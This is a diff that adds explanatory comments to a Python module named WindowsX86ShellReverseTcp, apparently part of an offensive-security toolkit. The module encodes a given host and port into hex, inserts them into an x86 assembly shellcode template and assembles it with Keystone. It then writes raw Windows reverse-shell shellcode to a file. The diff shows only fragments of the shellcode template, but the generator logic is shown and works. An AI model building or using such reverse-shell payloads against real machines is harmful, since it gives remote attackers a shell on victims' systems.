@@ -16,6 +16,7 @@ class WindowsX86ShellReverseTcp(BaseModule):
 
     @staticmethod
     def add_arguments(parser):
+        # Define command-line arguments required by the module
         parser.add_argument("--host", required=True, type=str, help="Target host")
         parser.add_argument("--port", required=True, type=int, help="Target port")
         parser.add_argument(
@@ -27,6 +28,7 @@ class WindowsX86ShellReverseTcp(BaseModule):
 
     @staticmethod
     def host_to_hex(host: str) -> str:
+        # Convert IPv4 address to little-endian hex string
         try:
             octets = host.split(".")
             if len(octets) != 4:
@@ -38,23 +40,27 @@ class WindowsX86ShellReverseTcp(BaseModule):
 
     @staticmethod
     def port_to_hex(port: int) -> str:
+        # Convert port number to little-endian hex string
         if not (0 < port < 65536):
             raise ValueError(f"Port number must be between 1 and 65535, got {port}")
         return f"{port & 0xFF:02x}{(port >> 8) & 0xFF:02x}"
 
     @staticmethod
     def main(args):
+        # Log the target host and port
         Logger.log("info", f"HOST {args.host}")
         Logger.log("info", f"PORT {args.port}")
         print()
 
         try:
+            # Convert host and port to hex representations
             host_hex = WindowsX86ShellReverseTcp.host_to_hex(args.host)
             port_hex = WindowsX86ShellReverseTcp.port_to_hex(args.port)
         except Exception:
             Logger.log("flaw", "Invalid host or port provided.")
             return
 
+        # Shellcode template with placeholders for host and port hex values
         shellcode_template = f"""
 cld
 call   0x88
@@ -205,7 +211,9 @@ call   ebp
 """
 
         try:
+            # Initialize Keystone assembler for x86 32-bit mode
             ks = Ks(KS_ARCH_X86, KS_MODE_32)
+            # Assemble shellcode into bytes
             encoding, _ = ks.asm(shellcode_template)
         except KsError as e:
             Logger.log("flaw", f"Assembly failed: {e}")
@@ -216,6 +224,7 @@ call   ebp
 
         output_path = Path(args.output)
         try:
+            # Write raw shellcode bytes to output file
             with open(output_path, "wb") as f:
                 f.write(shellcode_bytes)
             Logger.log("good", f"Raw shellcode written to {output_path}")
